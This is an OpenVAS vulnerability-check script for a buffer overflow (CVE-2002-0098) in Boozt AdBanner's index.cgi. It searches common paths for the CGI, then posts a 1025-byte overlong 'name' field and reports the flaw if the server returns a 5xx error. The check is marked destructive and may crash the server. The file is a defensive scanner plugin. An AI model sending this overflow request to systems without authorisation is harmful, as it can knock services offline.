# OpenVAS Vulnerability Test
# $Id: boozt_admin_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Boozt index.cgi overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It seems that index.cgi from Boozt AdBanner
is installed and is vulnerable to a buffer overflow:
it doesn't check the length of user supplied variables 
before copying them to internal arrays.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# To: bugtraq@securityfocus.com
# From: rsanmcar@alum.uax.es
# Subject: BOOZT! Standard 's administration cgi vulnerable to buffer overflow
# Date: Sat, 5 Jan 2002 18:04:48 GMT
#
# Affected:
# Boozt 0.9.8alpha

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11082");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(6281);
 script_cve_id("CVE-2002-0098");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Boozt index.cgi overflow");
 
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 script_family("Gain a shell remotely");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########


include("http_func.inc");
include("http_keepalive.inc");

d1[0] = "/cgi-bin";
d1[1] = "/scripts";
d1[2] = "";

d2[0] = "/boozt";
d2[1] = "";

d3[0] = "/admin";
d3[1] = "";

function find_boozt(port)
{
  for (i=0; i<3; i=i+1)
  {
    for (j=0; j<2; j=j+1)
    {
      for (k=0; k<2; k=k+1)
      {
        u = string(d1[i], d2[j], d3[k], "/index.cgi");
        r = http_get(port: port, item: u);
        r = http_keepalive_send_recv(port:port, data:r);
        if(ereg(string:r, pattern:"^HTTP.* 200 .*"))
        {
          if ("BOOZT Adbanner system" >< r) return(u);
        }
      }
    }
  }
  return (0);
}

#######


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

bz = find_boozt(port: port); 
if (! bz) exit(0);

r = http_post(port: port, item: bz);
r = r - string("\r\n\r\n");
r = string(r, "\r\nContent-Length: 1030\r\n",
	"Content-Type: application/x-www-form-urlencoded\r\n\r\n",
	"name=", crap(1025), "\r\n\r\n");

soc = http_open_socket(port);
if(! soc) exit(0);
send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);

if (ereg(string: r, pattern: "^HTTP/[0-9.]+ +5[0-9][0-9] "))
{
  security_message(port);
  exit(0);
}

m="It seems that index.cgi from Boozt AdBanner
is installed.
Old versions of the CGI were vulnerable to a buffer overflow.
However, OpenVAS could not exploit it there.";
 
security_message(port: port, data: m);
